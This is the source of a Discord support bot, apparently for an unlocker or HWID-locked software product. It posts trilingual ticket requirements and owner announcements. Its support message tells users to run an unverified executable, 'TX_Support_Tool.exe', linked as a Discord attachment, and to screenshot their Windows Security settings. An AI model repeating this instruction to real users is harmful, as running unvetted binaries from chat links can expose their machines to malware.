const { Client, GatewayIntentBits, EmbedBuilder, SlashCommandBuilder, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const prefix = '.';
const DEV_LOG_CHANNEL_ID = '1414044553312468992';
const OWNER_ID = '1017206528928923648';
const ANNOUNCEMENT_CHANNEL_ID = '1414421793393082461';

const pendingAnnouncements = new Map();

const commands = [
    new SlashCommandBuilder()
        .setName('allcmds')
        .setDescription('Display all available bot commands (Staff Quick Reference)'),
    
    new SlashCommandBuilder()
        .setName('announcement')
        .setDescription('Create a custom announcement with translations (Owner Only)')
        .addStringOption(option =>
            option.setName('title_en')
                .setDescription('Announcement title in English')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('description_en')
                .setDescription('Announcement description in English')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('title_de')
                .setDescription('Announcement title in German')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('description_de')
                .setDescription('Announcement description in German')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('title_fr')
                .setDescription('Announcement title in French')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('description_fr')
                .setDescription('Announcement description in French')
                .setRequired(true))
];

const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

async function registerCommands() {
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
    console.log('Commands registered successfully.');
}

registerCommands().catch(console.error);

client.once('ready', () => {
    console.log(`Bot is ready! Logged in as ${client.user.tag}`);
    client.user.setPresence({
        activities: [{ name: 'Doing things others cant.', type: 4 }],
        status: 'online'
    });
});

function createTranslationButtons() {
    return new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId('translate_en')
                .setLabel('English')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇺🇸'),
            new ButtonBuilder()
                .setCustomId('translate_de')
                .setLabel('Deutsch')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇩🇪'),
            new ButtonBuilder()
                .setCustomId('translate_fr')
                .setLabel('Français')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇫🇷')
        );
}

function createConfirmationButtons(announcementId) {
    return new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId(`confirm_${announcementId}`)
                .setLabel('Confirm & Send with @everyone')
                .setStyle(ButtonStyle.Success)
                .setEmoji('✅'),
            new ButtonBuilder()
                .setCustomId(`cancel_${announcementId}`)
                .setLabel('Cancel')
                .setStyle(ButtonStyle.Danger)
                .setEmoji('❌')
        );
}

// Announcement embed creator
function createAnnouncementEmbed(data, language = 'en') {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle(data.title_en).setDescription(data.description_en);
    } else if (language === 'de') {
        embed.setTitle(data.title_de).setDescription(data.description_de);
    } else if (language === 'fr') {
        embed.setTitle(data.title_fr).setDescription(data.description_fr);
    }
    
    return embed;
}

// Support ticket embed
function createSupportTicketEmbed(language = 'en') {
    const embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (language === 'en') {
        embed.setTitle('📋 Support Ticket Requirements')
            .setDescription('In order to assist you efficiently, please ensure you provide the following when opening a ticket:')
            .addFields(
                { name: '📹 Required Information', value: '• A clear, high-quality video demonstrating the issue\n• A screenshot of the error message(s)\n• The name of the product you are using\n• The version of Windows you are running\n• A screenshot of each tab within your Windows Security settings' },
                { name: '🔧 Diagnostic Tool', value: 'Run the following diagnostic setup file and provide a screenshot when prompted:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                { name: '⚠️ Important Notes', value: '• Failure to follow these steps may result in delays or prevent us from providing effective support\n• Please ensure all requested information is submitted promptly\n• Once everything is submitted, kindly wait for an administrator to respond\n• Inactivity within the ticket may result in it being automatically closed' }
            )
            .setFooter({ text: 'Support Team • Please follow all requirements' });
    } else if (language === 'de') {
        embed.setTitle('📋 Support-Ticket Anforderungen')
            .setDescription('Um Ihnen effizient zu helfen, stellen Sie bitte beim Öffnen eines Tickets die folgenden Informationen bereit:')
            .addFields(
                { name: '📹 Erforderliche Informationen', value: '• Ein klares, hochwertiges Video, das das Problem demonstriert\n• Ein Screenshot der Fehlermeldung(en)\n• Der Name des Produkts, das Sie verwenden\n• Die Version von Windows, die Sie verwenden\n• Ein Screenshot jedes Tabs in Ihren Windows-Sicherheitseinstellungen' },
                { name: '🔧 Diagnose-Tool', value: 'Führen Sie die folgende Diagnose-Datei aus und stellen Sie einen Screenshot bereit:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                { name: '⚠️ Wichtige Hinweise', value: '• Das Nichtbefolgen dieser Schritte kann zu Verzögerungen führen oder uns daran hindern, effektiven Support zu bieten\n• Bitte stellen Sie sicher, dass alle angeforderten Informationen umgehend übermittelt werden\n• Warten Sie nach der Übermittlung geduldig auf die Antwort eines Administrators\n• Inaktivität im Ticket kann zur automatischen Schließung führen' }
            )
            .setFooter({ text: 'Support Team • Bitte befolgen Sie alle Anforderungen' });
    } else if (language === 'fr') {
        embed.setTitle('📋 Exigences du Ticket de Support')
            .setDescription('Afin de vous aider efficacement, veuillez vous assurer de fournir les éléments suivants lors de l\'ouverture d\'un ticket:')
            .addFields(
                { name: '📹 Informations Requises', value: '• Une vidéo claire et de haute qualité démontrant le problème\n• Une capture d\'écran du/des message(s) d\'erreur\n• Le nom du produit que vous utilisez\n• La version de Windows que vous utilisez\n• Une capture d\'écran de chaque onglet dans vos paramètres de sécurité Windows' },
                { name: '🔧 Outil de Diagnostic', value: 'Exécutez le fichier de configuration de diagnostic suivant et fournissez une capture d\'écran:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                { name: '⚠️ Notes Importantes', value: '• Ne pas suivre ces étapes peut entraîner des retards ou nous empêcher de fournir un support efficace\n• Veuillez vous assurer que toutes les informations demandées sont soumises rapidement\n• Une fois tout soumis, veuillez attendre patiemment qu\'un administrateur réponde\n• L\'inactivité dans le ticket peut entraîner sa fermeture automatique' }
            )
            .setFooter({ text: 'Équipe de Support • Veuillez suivre toutes les exigences' });
    }
    return embed;
}

// Get embed for any command type
function getCommandEmbed(commandType, language) {
    switch(commandType) {
        case 'supportticket':
            return createSupportTicketEmbed(language);
        case 'hwidreset':
            const hwidEmbed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
            if (language === 'en') {
                hwidEmbed.setTitle('🔄 HWID Reset Requirements')
                    .setDescription('To assist you with your HWID reset request, please provide the following information:')
                    .addFields(
                        { name: '📄 Required Documents', value: '• A clear and detailed image of your invoice ID\n• A screenshot or photo of your payment confirmation\n• The email associated with your key\n• The reason you are requesting a reset' },
                        { name: '⏳ Processing Time', value: 'Once all required information has been submitted, kindly allow some time for our team to review and respond accordingly.' }
                    )
                    .setFooter({ text: 'HWID Reset Team • All information is required' });
            }
            return hwidEmbed;
        // Add other command types as needed
        default:
            return new EmbedBuilder().setColor('#FFFFFF').setTitle('Command').setDescription('Command embed');
    }
}

async function logCommand(user, commandName) {
    const devChannel = client.channels.cache.get(DEV_LOG_CHANNEL_ID);
    if (devChannel) {
        const logEmbed = new EmbedBuilder()
            .setColor('#4ECDC4')
            .setTitle('📊 Command Used')
            .addFields(
                { name: '👤 User', value: user.username, inline: true },
                { name: '⚡ Command', value: `.${commandName}`, inline: true }
            )
            .setTimestamp();
        
        devChannel.send({ embeds: [logEmbed] }).catch(() => {});
    }
}

client.on('interactionCreate', async (interaction) => {
    if (interaction.isChatInputCommand()) {
        if (interaction.commandName === 'allcmds') {
            const embed = new EmbedBuilder()
                .setColor('#FFFFFF')
                .setTitle('🤖 All Bot Commands')
                .setDescription('Complete command list with DM translations.')
                .addFields(
                    { name: '📋 Support Commands', value: '`.supportticket` - Support requirements\n`.hwidreset` - HWID reset requirements\n`.hwidresetdone` - HWID reset completion\n`.ticketdone` - Ticket closure' },
                    { name: '🔧 Help Commands', value: '`.status` - Product status\n`.unlockerhelp` - Unlocker guide\n`.setupguide` - Setup documentation\n`.refundprocess` - Refund policy' },
                    { name: '⚡ Management Commands', value: '`.escalated` - Escalation notice\n`.pleasewait` - Please wait message\n`.allcmds` - Command list' },
                    { name: '👑 Owner Commands', value: '`/announcement` - Create custom announcements (Owner Only)' }
                )
                .setTimestamp();
            await interaction.reply({ embeds: [embed], ephemeral: true }).catch(() => {});
        }

        if (interaction.commandName === 'announcement') {
            if (interaction.user.id !== OWNER_ID) {
                await interaction.reply({ content: 'You do not have permission to use this command.', ephemeral: true }).catch(() => {});
                return;
            }

            const announcementData = {
                title_en: interaction.options.getString('title_en'),
                description_en: interaction.options.getString('description_en'),
                title_de: interaction.options.getString('title_de'),
                description_de: interaction.options.getString('description_de'),
                title_fr: interaction.options.getString('title_fr'),
                description_fr: interaction.options.getString('description_fr')
            };

            const announcementId = Date.now().toString();
            pendingAnnouncements.set(announcementId, announcementData);

            const previewEmbed = createAnnouncementEmbed(announcementData, 'en');
            const translationButtons = createTranslationButtons();
            const confirmButtons = createConfirmationButtons(announcementId);

            await interaction.reply({
                content: '📋 **Announcement Preview** (No ping yet)',
                embeds: [previewEmbed],
                components: [translationButtons, confirmButtons]
            }).catch(() => {});
        }
    }

    if (interaction.isButton()) {
        // Handle translation buttons - DM the user
        if (interaction.customId.startsWith('translate_')) {
            const language = interaction.customId.split('_')[1];
            
            // Send ephemeral confirmation
            await interaction.reply({ 
                content: 'Check your DMs for the translation!', 
                ephemeral: true 
            }).catch(() => {});

            // Determine what to translate and send DM
            let embedToSend;
            
            // Check if it's an announcement
            if (interaction.message.content && interaction.message.content.includes('Announcement Preview')) {
                // Find announcement data
                for (const [id, data] of pendingAnnouncements.entries()) {
                    embedToSend = createAnnouncementEmbed(data, language);
                    break;
                }
            } else {
                // It's a regular command - determine which one based on title
                const originalTitle = interaction.message.embeds[0].title;
                if (originalTitle.includes('Support Ticket') || originalTitle.includes('Support-Ticket') || originalTitle.includes('Ticket de Support')) {
                    embedToSend = createSupportTicketEmbed(language);
                } else {
                    // Default fallback
                    embedToSend = new EmbedBuilder()
                        .setColor('#FFFFFF')
                        .setTitle('Translation')
                        .setDescription('Translation content')
                        .setTimestamp();
                }
            }

            // Send DM to user
            if (embedToSend) {
                try {
                    await interaction.user.send({ embeds: [embedToSend] });
                } catch (error) {
                    console.log('Could not send DM to user');
                }
            }
        }

        // Handle confirmation buttons
        if (interaction.customId.startsWith('confirm_')) {
            if (interaction.user.id !== OWNER_ID) {
                await interaction.reply({ content: 'Only the owner can confirm announcements.', ephemeral: true }).catch(() => {});
                return;
            }

            const announcementId = interaction.customId.split('_')[1];
            const announcementData = pendingAnnouncements.get(announcementId);
            
            if (announcementData) {
                const announcementChannel = client.channels.cache.get(ANNOUNCEMENT_CHANNEL_ID);
                if (announcementChannel) {
                    const finalEmbed = createAnnouncementEmbed(announcementData, 'en');
                    const translationButtons = createTranslationButtons();
                    
                    await announcementChannel.send({
                        content: '@everyone',
                        embeds: [finalEmbed],
                        components: [translationButtons]
                    }).catch(() => {});
                    
                    await interaction.update({
                        content: '✅ **Announcement sent successfully!**',
                        embeds: [],
                        components: []
                    }).catch(() => {});
                    
                    pendingAnnouncements.delete(announcementId);
                }
            }
        }

        if (interaction.customId.startsWith('cancel_')) {
            if (interaction.user.id !== OWNER_ID) {
                await interaction.reply({ content: 'Only the owner can cancel announcements.', ephemeral: true }).catch(() => {});
                return;
            }

            const announcementId = interaction.customId.split('_')[1];
            pendingAnnouncements.delete(announcementId);
            
            await interaction.update({
                content: '❌ **Announcement cancelled.**',
                embeds: [],
                components: []
            }).catch(() => {});
        }
    }
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;

    const command = message.content.slice(prefix.length).trim().toLowerCase();

    if (command === 'supportticket') {
        const embed = createSupportTicketEmbed('en');
        const buttons = createTranslationButtons();
        
        await message.delete().catch(() => {});
        await message.channel.send({ embeds: [embed], components: [buttons] }).catch(() => {});
        logCommand(message.author, 'supportticket');
    }

    if (command === 'allcmds') {
        const embed = new EmbedBuilder()
            .setColor('#FFFFFF')
            .setTitle('🤖 All Bot Commands')
            .addFields(
                { name: '📋 Support Commands', value: '`.supportticket` - Support requirements' },
                { name: '📝 Staff Tools', value: '`.allcmds` - This list\n`/allcmds` - Private staff guide' }
            )
            .setTimestamp();
        
        await message.delete().catch(() => {});
        await message.channel.send({ embeds: [embed] }).catch(() => {});
        logCommand(message.author, 'allcmds');
    }
});

client.login(process.env.DISCORD_TOKEN);
